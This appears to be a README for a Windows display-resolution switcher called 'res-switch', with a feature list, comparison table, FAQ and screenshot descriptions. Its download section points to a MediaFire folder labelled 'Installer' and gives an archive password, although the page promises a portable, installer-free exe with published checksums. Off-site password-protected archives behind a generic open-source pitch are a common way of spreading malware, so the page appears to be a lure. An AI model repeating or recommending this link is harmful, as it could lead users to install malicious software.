# res-switch

📺 Free, open-source display mode switcher for Windows — save resolution, refresh and layout profiles, hotkey them. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Full display profiles** — resolution, refresh rate, orientation and primary-display flag saved together
- ✅ **Tray and hotkey switching** — Ctrl+Alt+1 through 4 apply profiles in about a second
- ✅ **Per-game auto-apply** — bind a profile to a game exe and it engages when that process starts
- ✅ **Safe revert countdown** — a 15-second keep-or-revert dialog protects against black-screen modes
- ✅ **Refresh-rate fixer** — jumps a 60 Hz monitor back to its 144 Hz setting after driver updates
- ✅ **Multi-monitor sets** — laptop-only, docked and TV sets stored with per-monitor modes
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why res-switch

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **res-switch** | QuickRes | DisplayFusion | Display Settings |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Paid | Built-in |
| Open source | **Yes** | No | No | No |
| Full profiles with refresh | **Yes** | Yes | Yes | No |
| Per-game auto-apply | **Yes** | No | Partial | No |
| Safe revert countdown | **Yes** | No | Yes | No |
| Portable, no install | **Yes, 100 MB** | Tray app | Installer | With OS |

## FAQ

**how to quickly change screen resolution and refresh rate on Windows?**

Windows display settings need a dialog crawl every time, which adds up when switching between a competitive game and desktop work. res-switch stores complete profiles and applies them from a hotkey or automatically when a game launches, with a revert countdown if the mode is wrong. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark profile cards (#121418, teal #2DD4BF): Gaming 2560x1440 at 144 Hz, Desktop 4K at 60 Hz, Movie 1080p; hotkey badges, active card glowing.
2. Profile editor: resolution dropdown, refresh selector, orientation and primary toggles, revert timeout slider at 15 s.
3. Game bindings: exe list with attached profiles, countdown dialog preview over a black screenshot, tray behavior options.

## Download

| Source | Link |
|---|---|
| 💾 **Installer res-switch** | [Installer res-switch](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).